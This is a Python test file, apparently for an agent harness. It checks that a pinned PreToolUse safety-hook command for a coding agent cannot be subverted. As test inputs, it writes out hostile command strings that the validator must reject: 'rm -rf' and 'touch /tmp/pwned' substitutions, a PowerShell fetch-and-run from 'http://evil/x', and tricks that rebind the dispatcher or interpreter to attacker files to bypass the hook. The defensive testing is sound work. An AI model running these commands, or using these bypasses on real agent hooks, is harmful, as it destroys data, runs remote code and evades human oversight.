            "> /dev/null",
            ">> /dev/null",
            "2> /dev/null",
            "| cat",
            "&& true",
            "|| true",
            "<<< '{}'",
        )
        for suffix in suffixes:
            with self.subTest(suffix=suffix):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": f"expected={pin}; {invocation} {suffix}",
                            "commandWindows": f"$expected='{pin}'; {windows}",
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_floor_rejects_windows_invocation_control_operators(self) -> None:
        pin = "2" * 64
        posix = "python $HOME/.claude/hooks/dispatch.py " "--event pre --runtime codex"
        invocation = (
            "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        suffixes = (
            "< $null",
            "> $null",
            ">> $null",
            "2> $null",
            "| Out-Null",
            "&& exit 0",
            "|| exit 0",
            "<<< '{}'",
            "& Write-Output bypass",
        )
        for suffix in suffixes:
            with self.subTest(suffix=suffix):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": f"expected={pin}; {posix}",
                            "commandWindows": (
                                f"$expected='{pin}'; {invocation} {suffix}"
                            ),
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_floor_allows_standalone_invocations_with_literal_controls(
        self,
    ) -> None:
        pin = "3" * 64
        posix = (
            f"expected='{pin}'\n"
            "python $HOME/.claude/hooks/dispatch.py "
            "--event pre --runtime codex # > /dev/null | cat && true"
        )
        windows = (
            f"$expected='{pin}'\n"
            "& py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex # > $null | Out-Null && exit 0"
        )
        group = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": posix,
                    "commandWindows": windows,
                }
            ],
        }
        current = json.dumps({"hooks": {"PreToolUse": [group]}})
        self.assertEqual(harness.repo_codex_floor_groups(current, pin), [group])
        for windows in (False, True):
            with self.subTest(windows=windows):
                self.assertTrue(
                    harness.is_safe_floor_invocation_segment(
                        "python 'literal < > | && || <<<'", windows=windows
                    )
                )

    def test_repo_floor_rejects_extra_executable_segments(self) -> None:
        pin = "5" * 64
        posix_invocation = (
            "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
        )
        windows_invocation = (
            "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        valid_posix = f"expected={pin}; {posix_invocation}"
        valid_windows = f"$expected='{pin}'; {windows_invocation}"
        invalid_pairs = (
            (f"echo before; {valid_posix}", valid_windows),
            (f"{valid_posix}; echo after", valid_windows),
            (valid_posix, f"Write-Output before; {valid_windows}"),
            (valid_posix, f"{valid_windows}; Write-Output after"),
            (f"{valid_posix}; {posix_invocation}", valid_windows),
            (valid_posix, f"{valid_windows}; {windows_invocation}"),
            (f"{posix_invocation}; expected={pin}", valid_windows),
            (valid_posix, f"{windows_invocation}; $expected='{pin}'"),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": command,
                            "commandWindows": command_windows,
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_floor_rejects_command_substitution_in_invocation(self) -> None:
        pin = "7" * 64
        good_posix = (
            "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
        )
        good_windows = (
            "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        good_posix_q = (
            'python "$HOME/.claude/hooks/dispatch.py" --event pre --runtime codex'
        )
        invalid_pairs = (
            (
                f"expected={pin}; {good_posix} $(rm -rf /critical/outside)",
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f"expected={pin}; {good_posix} `rm -rf /critical/outside`",
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f"expected={pin}; {good_posix}",
                f"$expected='{pin}'; {good_windows} $(Remove-Item x)",
            ),
            # Command substitution hidden INSIDE double quotes still executes.
            (
                f'expected={pin}; {good_posix_q} "$(touch /tmp/pwned)"',
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f'expected={pin}; {good_posix_q} "`id`"',
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f"expected={pin}; {good_posix}",
                f"$expected='{pin}'; {good_windows} \"$(iex(irm http://evil/x))\"",
            ),
            # PowerShell argument subexpression / array subexpression.
            (
                f"expected={pin}; {good_posix}",
                f"$expected='{pin}'; {good_windows} (Remove-Item x)",
            ),
            (
                f"expected={pin}; {good_posix}",
                f"$expected='{pin}'; {good_windows} @(Remove-Item x)",
            ),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": command,
                            "commandWindows": command_windows,
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])
        self.assertFalse(
            harness.is_safe_floor_invocation_segment(
                "python dispatch.py $(rm -rf x)", windows=False
            )
        )
        self.assertFalse(
            harness.is_safe_floor_invocation_segment(
                "python dispatch.py `rm x`", windows=False
            )
        )
        # Command substitution hidden inside double quotes must still be rejected.
        self.assertFalse(
            harness.is_safe_floor_invocation_segment(
                'python dispatch.py "$(rm -rf x)"', windows=False
            )
        )
        self.assertFalse(
            harness.is_safe_floor_invocation_segment(
                'python dispatch.py "`rm x`"', windows=False
            )
        )
        self.assertFalse(
            harness.is_safe_floor_invocation_segment(
                'py -3 dispatch.py "$(Remove-Item x)"', windows=True
            )
        )
        self.assertFalse(
            harness.is_safe_floor_invocation_segment(
                "py -3 dispatch.py @(Remove-Item x)", windows=True
            )
        )
        # A single-quoted (inert) literal remains safe on both shells.
        self.assertTrue(
            harness.is_safe_floor_invocation_segment(
                "python dispatch.py '$(rm -rf x)'", windows=False
            )
        )

    def test_repo_floor_rejects_relative_interpreter_head(self) -> None:
        # A path-qualified interpreter head runs a repo-shipped attacker binary;
        # only a bare (PATH-resolved) or absolute interpreter may certify.
        pin = "a" * 64
        good_windows = (
            f"$expected='{pin}'; py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        good_posix = (
            f"expected={pin}; python $HOME/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        invalid_pairs = (
            (
                f"expected={pin}; ./python3 $HOME/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
                good_windows,
            ),
            (
                good_posix,
                f"$expected='{pin}'; & tools/py.exe -3 "
                "$env:USERPROFILE/.claude/hooks/dispatch.py --event pre --runtime codex",
            ),
            (
                f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
                "tools/bash .codex/invoke_deny_floor.sh",
                good_windows,
            ),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                doc = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [
                                {
                                    "matcher": "^Bash$",
                                    "hooks": [
                                        {
                                            "type": "command",
                                            "command": command,
                                            "commandWindows": command_windows,
                                        }
                                    ],
                                }
                            ]
                        }
                    }
                )
                self.assertEqual(harness.repo_codex_floor_groups(doc, pin), [])
        self.assertFalse(harness.token_is_python_executable("./python3"))
        self.assertFalse(harness.token_is_python_executable("tools/py.exe"))
        self.assertTrue(harness.token_is_python_executable("python3"))

    def test_repo_floor_rejects_bare_assignment_invocation(self) -> None:
        # A pure `VAR=path` assignment runs nothing (exit 0); it must never be
        # classified as the floor invocation, or the hook silently allows-all.
        pin = "b" * 64
        doc = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "matcher": "^Bash$",
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": (
                                        f"pin={pin}; "
                                        "d=$HOME/.claude/hooks/dispatch.py; "
                                        "x=./invoke_deny_floor.sh"
                                    ),
                                    "commandWindows": (
                                        f"$pin='{pin}'; "
                                        '$d="$env:USERPROFILE/.claude/hooks/dispatch.py"; '
                                        "$x='./invoke_deny_floor.ps1'"
                                    ),
                                }
                            ],
                        }
                    ]
                }
            }
        )
        self.assertEqual(harness.repo_codex_floor_groups(doc, pin), [])
        self.assertFalse(harness.token_is_wrapper("x=./invoke_deny_floor.sh", set()))
        self.assertFalse(
            harness.token_is_dispatcher("x=$HOME/.claude/hooks/dispatch.py", set())
        )

    def test_repo_floor_rejects_variable_rebinding_and_glued_floor_paths(self) -> None:
        pin = "c" * 64
        good_windows = (
            f"$expected='{pin}'; py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        good_posix = (
            f"expected={pin}; python $HOME/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        # A floor variable bound to the real dispatcher must not be rebindable to
        # an attacker path, built by concatenation past the marker, glued behind
        # a non-slash prefix, or point at a relative attacker interpreter.
        invalid_pairs = (
            (
                f"expected={pin}; d=$HOME/.claude/hooks/dispatch.py; d=./attacker.sh; "
                '"$d" --event pre --runtime codex',
                good_windows,
            ),
            (
                good_posix,
                f"$expected='{pin}'; $d='.claude/hooks/dispatch.py'; "
                "$d='.claude/hooks/attacker.ps1'; & $d --event pre --runtime codex",
            ),
            (
                good_posix,
                f"$expected='{pin}'; $d='.claude/hooks/dispatch.py'+'.ps1'; "
                "& $d --event pre --runtime codex",
            ),
            (
                f'expected={pin}; d=".claude/hooks/dispatch.py"evil; '
                '"$d" --event pre --runtime codex',
                good_windows,
            ),
            (
                f"expected={pin}; d=x.claude/hooks/dispatch.py; "
                '"$d" --event pre --runtime codex',
                good_windows,
            ),
            (
                f"expected={pin}; d=.claude/hooks/dispatch.py+evil; "
                '"$d" --event pre --runtime codex',
                good_windows,
            ),
            (
                good_posix,
                f"$expected='{pin}';"
                "$d=Join-Path $env:USERPROFILE '.claude\\hooks\\dispatch.py';"
                "$p='x/py.exe';& $p -3 $d --event pre --runtime codex",
            ),
            # quote-glued prefix: bash concatenates evil'.claude/...' -> evil.claude/...
            (
                f"pin={pin}; d=evil'.claude/hooks/dispatch.py'; "
                '"$d" --event pre --runtime codex',
                good_windows,
            ),
            (
                f"pin={pin}; d='evil'.claude/hooks/dispatch.py; "
                '"$d" --event pre --runtime codex',
                good_windows,
            ),
            # repo-relative / $PWD dispatcher would run a repo-shipped attacker
            # file; only the HOME-anchored global path may certify.
            (
                f"expected={pin}; python $PWD/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
                good_windows,
            ),
            (
                f"expected={pin}; python .claude/hooks/dispatch.py "
                "--event pre --runtime codex",
                good_windows,
            ),
        )
        # value_binds_anchored_floor_path is a strict whitelist: only the exact
        # dispatcher/interpreter/wrapper value shapes bind; everything else fails.
        for good in (
            "$HOME/.claude/hooks/dispatch.py",
            "${HOME}/.claude/hooks/dispatch.py",
            "~/.claude/hooks/dispatch.py",
            "$env:USERPROFILE/.claude/hooks/dispatch.py",
            "$env:USERPROFILE+'/.claude/hooks/dispatch.py'",
            "Join-Path $env:SystemRoot 'py.exe'",
            ".codex/invoke_deny_floor.sh",
        ):
            self.assertTrue(harness.value_binds_anchored_floor_path(good), good)
        for bad in (
            "evil'.claude/hooks/dispatch.py'",
            "x.claude/hooks/dispatch.py",
            ".claude/hooks/dispatch.py+evil",
            "./attacker.sh",
            "x/py.exe",
            "evilinvoke_deny_floor.sh",
            '"$HOME"evil"/.claude/hooks/dispatch.py"',
            # dispatcher must be HOME-anchored: relative / $PWD / arbitrary vars
            ".claude/hooks/dispatch.py",
            "'.claude/hooks/dispatch.py'",
            "$PWD/.claude/hooks/dispatch.py",
            "$oldpwd/.claude/hooks/dispatch.py",
            "$repo/.claude/hooks/dispatch.py",
            "$PWD/py.exe",
        ):
            self.assertFalse(harness.value_binds_anchored_floor_path(bad), bad)
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                doc = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [
                                {
                                    "matcher": "^Bash$",
                                    "hooks": [
                                        {
                                            "type": "command",
                                            "command": command,
                                            "commandWindows": command_windows,
                                        }
                                    ],
                                }
                            ]
                        }
                    }
                )
                self.assertEqual(harness.repo_codex_floor_groups(doc, pin), [])

    def test_repo_floor_rejects_sibling_dispatcher_path_impersonation(self) -> None:
        pin = "d" * 64
        good_windows = (
            f"$expected='{pin}'; py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        # A sibling file whose path merely CONTAINS the dispatcher path, or a
        # variable bound to such a sibling, must not certify.
        invalid_pairs = (
            (
                f"expected={pin}; .claude/hooks/dispatch.py.evil "
                "--event pre --runtime codex",
                f"$expected='{pin}'; & .claude/hooks/dispatch.py.evil "
                "--event pre --runtime codex",
            ),
            (
                f"expected={pin}; python $HOME/.claude/hooks/dispatch.py2 "
                "--event pre --runtime codex",
                good_windows,
            ),
            (
                f"expected={pin}; d=$HOME/.claude/hooks/dispatch.py.evil; "
                "python $d --event pre --runtime codex",
                good_windows,
            ),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                doc = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [
                                {
                                    "matcher": "^Bash$",
                                    "hooks": [
                                        {
                                            "type": "command",
                                            "command": command,
                                            "commandWindows": command_windows,
                                        }
                                    ],
                                }
                            ]
                        }
                    }
                )
                self.assertEqual(harness.repo_codex_floor_groups(doc, pin), [])

    def test_repo_floor_requires_wrapper_as_executed_operand(self) -> None:
        pin = "e" * 64
        good_posix = (
            f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
            "/bin/sh .codex/invoke_deny_floor.sh"
        )
        good_windows = (
            f"$expected='{pin}'; "
            "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
            "& .codex/invoke_deny_floor.ps1"
        )
        # The legitimate wrapper form certifies.
        good_doc = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "matcher": "^Bash$",
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": good_posix,
                                    "commandWindows": good_windows,
                                }
                            ],
                        }
                    ]
                }
            }
        )
        self.assertEqual(len(harness.repo_codex_floor_groups(good_doc, pin)), 1)
        # A trailing wrapper argument to `sh -c '<evil>'` or a `-Command`
        # payload before `-File` must NOT certify — the wrapper must be the
        # executed script operand.
        invalid_pairs = (
            (
                f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
                "/bin/sh -c 'id' .codex/invoke_deny_floor.sh",
                good_windows,
            ),
            (
                good_posix,
                f"$expected='{pin}'; "
                "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
                "powershell -Command 'id' -File .codex/invoke_deny_floor.ps1",
            ),
            (
                f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
                "/bin/bash --version .codex/invoke_deny_floor.sh",
                good_windows,
            ),
            (
                f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
                "/bin/bash --help .codex/invoke_deny_floor.sh",
                good_windows,
            ),
            (
                good_posix,
                f"$expected='{pin}'; "
                "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
                "Start-Process -File .codex/invoke_deny_floor.ps1",
            ),
            (
                good_posix,
                f"$expected='{pin}'; "
                "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
                "saps -File .codex/invoke_deny_floor.ps1",
            ),
            (
                good_posix,
                f"$expected='{pin}'; "
                "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
                "powershell -File:.codex/invoke_deny_floor.ps1",
            ),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                doc = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [
                                {
                                    "matcher": "^Bash$",
                                    "hooks": [
                                        {
                                            "type": "command",
                                            "command": command,
                                            "commandWindows": command_windows,
                                        }
                                    ],
                                }
                            ]
                        }
                    }
                )
                self.assertEqual(harness.repo_codex_floor_groups(doc, pin), [])

    def test_repo_floor_requires_dispatcher_as_python_script_operand(self) -> None:
        pin = "8" * 64
        good_posix = (
            "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
        )
        good_windows = (
            "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        invalid_pairs = (
            (
                f"expected={pin}; python -c pass $HOME/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f"expected={pin}; python -m http.server "
                "$HOME/.claude/hooks/dispatch.py --event pre --runtime codex",
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f"expected={pin}; {good_posix}",
                f"$expected='{pin}'; py -3 -c pass "
                "$env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
            ),
        )
        no_op_options = (
            "-V",
            "--version",
            "-h",
            "--help",
            "-VV",
            "-X help",
            "-W ignore",
            "-u",
            "-Z",
        )
        invalid_pairs += tuple(
            (
                f"expected={pin}; python {option} "
                "$HOME/.claude/hooks/dispatch.py --event pre --runtime codex",
                f"$expected='{pin}'; {good_windows}",
            )
            for option in no_op_options
        )
        invalid_pairs += (
            (
                f"expected={pin}; python3 -3 $HOME/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
                f"$expected='{pin}'; {good_windows}",
            ),
            (
                f"expected={pin}; {good_posix}",
                f"$expected='{pin}'; py -V "
                "$env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
            ),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": command,
                            "commandWindows": command_windows,
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_platform_floor_command_rejects_nonexecuting_interpreter_shapes(
        self,
    ) -> None:
        pin = "5" * 64
        posix_prefix = f"expected={pin}; dispatcher=$HOME/.claude/hooks/dispatch.py; "
        windows_prefix = (
            f"$expected='{pin}'; " "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
        )
        self.assertTrue(
            harness.platform_project_floor_command(
                posix_prefix + "/bin/sh -- .codex/invoke_deny_floor.sh",
                pin,
            )
        )
        self.assertTrue(
            harness.platform_project_floor_command(
                windows_prefix + "powershell -File .codex/invoke_deny_floor.ps1",
                pin,
                windows=True,
            )
        )
        invalid = (
            (posix_prefix + "/bin/bash --version .codex/invoke_deny_floor.sh", False),
            (posix_prefix + "/bin/bash --help .codex/invoke_deny_floor.sh", False),
            (posix_prefix + "/bin/bash -c id .codex/invoke_deny_floor.sh", False),
            (
                windows_prefix + "Start-Process -File .codex/invoke_deny_floor.ps1",
                True,
            ),
            (windows_prefix + "saps -File .codex/invoke_deny_floor.ps1", True),
            (
                windows_prefix
                + "powershell -Version -File .codex/invoke_deny_floor.ps1",
                True,
            ),
            (
                windows_prefix + "powershell -File:.codex/invoke_deny_floor.ps1",
                True,
            ),
        )
        for command, windows in invalid:
            with self.subTest(command=command):
                self.assertFalse(
                    harness.platform_project_floor_command(
                        command,
                        pin,
                        windows=windows,
                    )
                )

    def test_repo_floor_rejects_non_inert_setup_segments(self) -> None:
        pin = "6" * 64
        posix_invocation = (
            "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
        )
        windows_invocation = (
            "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        valid_posix = f"expected={pin}; {posix_invocation}"
        valid_windows = f"$expected='{pin}'; {windows_invocation}"
        invalid_pairs = (
            (f"note=unused; {valid_posix}", valid_windows),
            (valid_posix, f"$note='unused'; {valid_windows}"),
            (
                "dispatcher=$(printf $HOME/.claude/hooks/dispatch.py); "
                f"expected={pin}; exec python3 $dispatcher --event pre --runtime codex",
                valid_windows,
            ),
            (
                valid_posix,
                "$d=Write-Output $env:USERPROFILE/.claude/hooks/dispatch.py; "
                f"$expected='{pin}'; & $d --event pre --runtime codex",
            ),
        )
        for command, command_windows in invalid_pairs:
            with self.subTest(command=command, command_windows=command_windows):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": command,
                            "commandWindows": command_windows,
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_floor_rejects_windows_here_string_and_extra_call_operator(
        self,
    ) -> None:
        pin = "4" * 64
        posix = (
            f"expected={pin}; python $HOME/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        invalid_windows = (
            (
                f"$expected='{pin}'; & py -3 "
                "$env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex @'payload'@"
            ),
            (
                f"$expected='{pin}'; & & py -3 "
                "$env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex"
            ),
        )
        for command_windows in invalid_windows:
            with self.subTest(command_windows=command_windows):
                group = {
                    "matcher": "^Bash$",
                    "hooks": [
                        {
                            "type": "command",
                            "command": posix,
                            "commandWindows": command_windows,
                        }
                    ],
                }
                current = json.dumps({"hooks": {"PreToolUse": [group]}})
                self.assertEqual(harness.repo_codex_floor_groups(current, pin), [])

    def test_repo_owns_current_pinned_codex_floor_adapter(self) -> None:
        # agent-harness is an active Codex checkout, so it owns exactly one
        # project floor adapter pinned to the current dispatcher. This test
        # keeps the pin from silently drifting when dispatch.py changes.
        repo_root = Path(harness.__file__).resolve().parent
        adapter = repo_root / ".codex" / "hooks.json"
        self.assertTrue(
            adapter.is_file(),
            "agent-harness must own a .codex/hooks.json project floor adapter",
        )
        text = adapter.read_text(encoding="utf-8")
        pin = harness.normalized_text_sha256(
            repo_root / "templates" / "hooks" / "dispatch.py"
        )
        self.assertEqual(
            len(harness.repo_codex_floor_candidates(text)),
            1,
            "adapter must expose exactly one candidate floor handler",
        )
        self.assertEqual(
            len(harness.repo_codex_floor_groups(text, pin)),
            1,
            "adapter pin must match the current normalized dispatcher hash; "
            "refresh .codex/hooks.json after editing templates/hooks/dispatch.py",
        )

    def test_repo_floor_matches_blocking_handler_normalization(self) -> None:
        pin = "9" * 64
        posix = f"expected={pin}; python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
        windows = (
            f"$expected='{pin}'; py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        base_handler = {
            "type": "command",
            "command": posix,
            "commandWindows": windows,
        }
        # The canonical shape (positive timeout, synchronous) still certifies.
        good = {**base_handler, "timeout": 5}
        good_doc = json.dumps(
            {"hooks": {"PreToolUse": [{"matcher": "^Bash$", "hooks": [good]}]}}
        )
        self.assertEqual(len(harness.repo_codex_floor_groups(good_doc, pin)), 1)
        async_handler = {**base_handler, "async": True}
        async_doc = json.dumps(
            {"hooks": {"PreToolUse": [{"matcher": "^Bash$", "hooks": [async_handler]}]}}
        )
        self.assertEqual(harness.repo_codex_floor_groups(async_doc, pin), [])
        # Unknown compatibility-looking fields are ignored, and timeout null/0
        # normalize to blocking defaults rather than disabling the hook.
        for accepted_field in (
            {"background": True},
            {"nonBlocking": True},
            {"timeout": 0},
            {"timeout": None},
        ):
            with self.subTest(accepted_field=accepted_field):
                handler = {**base_handler, **accepted_field}
                doc = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [{"matcher": "^Bash$", "hooks": [handler]}]
                        }
                    }
                )
                self.assertEqual(len(harness.repo_codex_floor_groups(doc, pin)), 1)
        for invalid_field in (
            {"timeout": -1},
            {"timeout": "5"},
            {"timeout": True},
        ):
            with self.subTest(invalid_field=invalid_field):
                handler = {**base_handler, **invalid_field}
                doc = json.dumps(
                    {
                        "hooks": {
                            "PreToolUse": [{"matcher": "^Bash$", "hooks": [handler]}]
                        }
                    }
                )
                with self.assertRaises(harness.HarnessError):
                    harness.repo_codex_floor_groups(doc, pin)

    def test_repo_floor_requires_bound_pin_and_executable_variable_flow(self) -> None:
        pin = "f" * 64
        posix = (
            f"expected='{pin}'; dispatcher=$HOME/.claude/hooks/dispatch.py; "
            'exec python3 "$dispatcher" --event pre --runtime codex'
        )
        windows = (
            f"$expected='{pin}';"
            "$d=Join-Path $env:USERPROFILE '.claude\\hooks\\dispatch.py';"
            "$p=Join-Path $env:SystemRoot 'py.exe';"
            "& $p -3 $d --event pre --runtime codex"
        )
        group = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": posix,
                    "commandWindows": windows,
                }
            ],
        }
        current = json.dumps({"hooks": {"PreToolUse": [group]}})
        self.assertEqual(harness.repo_codex_floor_groups(current, pin), [group])

        loose_pin = json.loads(current)
        loose_pin["hooks"]["PreToolUse"][0]["hooks"][0]["command"] = (
            "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex " + pin
        )
        self.assertEqual(
            harness.repo_codex_floor_groups(json.dumps(loose_pin), pin), []
        )

    def test_repo_floor_rejects_non_command_handler(self) -> None:
        handler = {
            "type": "prompt",
            "command": (
                "python $HOME/.claude/hooks/dispatch.py --event pre --runtime codex"
            ),
            "commandWindows": (
                "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex"
            ),
        }
        current = json.dumps(
            {"hooks": {"PreToolUse": [{"matcher": "^Bash$", "hooks": [handler]}]}}
        )
        self.assertEqual(harness.repo_codex_floor_groups(current), [])

    def test_normalized_text_hash_ignores_line_endings(self) -> None:
        left = Path(self.temp.name) / "left.txt"
        right = Path(self.temp.name) / "right.txt"
        left.write_bytes(b"one\r\ntwo\r\n")
        right.write_bytes(b"one\ntwo\n")
        self.assertEqual(
            harness.normalized_text_sha256(left),
            harness.normalized_text_sha256(right),
        )

    def test_root_checkout_uses_normal_repo_for_root_and_subdirectory(self) -> None:
        repo = self.make_repo()
        nested = repo / "nested" / "child"
        nested.mkdir(parents=True)
        for requested_path in (repo, nested):
            with self.subTest(requested_path=requested_path):
                requested, authoritative = harness.root_checkout(requested_path)
                self.assertEqual(requested, repo.resolve())
                self.assertEqual(authoritative, repo.resolve())
                hooks, ok, detail = harness.codex_hook_source_status(
                    requested, authoritative
                )
                self.assertTrue(ok)
                self.assertEqual(hooks, (repo / ".codex" / "hooks.json").resolve())
                self.assertIn("normal checkout", detail)

    def test_codex_existing_cwd_preserves_only_nested_aliases(self) -> None:
        anchor = Path(Path.cwd().anchor)
        top_level_alias = anchor / "repo-alias"
        nested_alias = anchor / "parent" / "repo-alias"
        canonical = anchor / "real-repo"
        for alias, expected in (
            (top_level_alias, canonical),
            (nested_alias, nested_alias),
        ):
            with self.subTest(alias=alias):
                with mock.patch.object(
                    harness,
                    "path_is_alias",
                    side_effect=lambda candidate, alias=alias: candidate == alias,
                ):
                    with mock.patch.object(Path, "resolve", return_value=canonical):
                        self.assertEqual(harness.codex_existing_cwd(alias), expected)

    def test_codex_system_config_uses_program_data_known_folder(self) -> None:
        known_folder = Path(self.temp.name) / "known-program-data"
        poisoned_environment = str(Path(self.temp.name) / "poisoned-program-data")
        expected = known_folder / "OpenAI" / "Codex" / "config.toml"

        with mock.patch.object(harness.os, "name", "nt"):
            with mock.patch.dict(
                harness.os.environ, {"PROGRAMDATA": poisoned_environment}
            ):
                with mock.patch.object(
                    harness,
                    "windows_program_data_path",
                    return_value=known_folder,
                ):
                    actual = harness.codex_system_config_path()

        self.assertEqual(actual, expected)
        self.assertNotIn(poisoned_environment, str(actual))

    def test_windows_program_data_known_folder_failure_uses_codex_fallback(
        self,
    ) -> None:
        with mock.patch.object(
            harness.ctypes,
            "WinDLL",
            side_effect=OSError("fixture unavailable"),
            create=True,
        ):
            self.assertEqual(
                harness.windows_program_data_path(), Path("C:/ProgramData")
            )

    def test_root_checkout_supports_separate_git_dir(self) -> None:
        repo = self.make_separate_git_dir_repo()
        requested, authoritative = harness.root_checkout(repo)
        self.assertEqual(requested, repo.resolve())
        self.assertEqual(authoritative, repo.resolve())

    def test_root_checkout_rejects_linked_worktree_without_separate_root_fact(
        self,
    ) -> None:
        _, linked = self.make_linked_worktree(separate_git_dir=True)
        with self.assertRaisesRegex(
            harness.HarnessError,
            "cannot resolve root checkout from Git common directory",
        ):
            harness.root_checkout(linked)

    def test_root_checkout_rejects_non_repo(self) -> None:
        outside = Path(self.temp.name) / "outside"
        outside.mkdir()
        not_a_repo = subprocess.CompletedProcess(
            ["git", "rev-parse", "--show-toplevel"], 128, "", "not a repository"
        )
        with mock.patch.object(harness, "run", return_value=not_a_repo):
            with self.assertRaisesRegex(harness.HarnessError, "not a Git repository"):
                harness.root_checkout(outside)

    def test_linked_worktree_uses_root_only_hook_source(self) -> None:
        root, linked = self.make_linked_worktree()
        root_hooks = self.write_hooks(root, '{"hooks": {}}\n')
        requested, authoritative = harness.root_checkout(linked)
        hooks, ok, detail = harness.codex_hook_source_status(requested, authoritative)
        self.assertEqual(requested, linked.resolve())
        self.assertEqual(authoritative, root.resolve())
        self.assertEqual(hooks, root_hooks.resolve())
        self.assertTrue(ok)
        self.assertIn("Codex uses root checkout source", detail)
        self.assertIn("no worktree-local copy", detail)

    def test_linked_worktree_allows_identical_ignored_hook_copy(self) -> None:
        root, linked = self.make_linked_worktree()
        text = '{"hooks": {}}\n'
        root_hooks = self.write_hooks(root, text)
        self.write_hooks(linked, text)
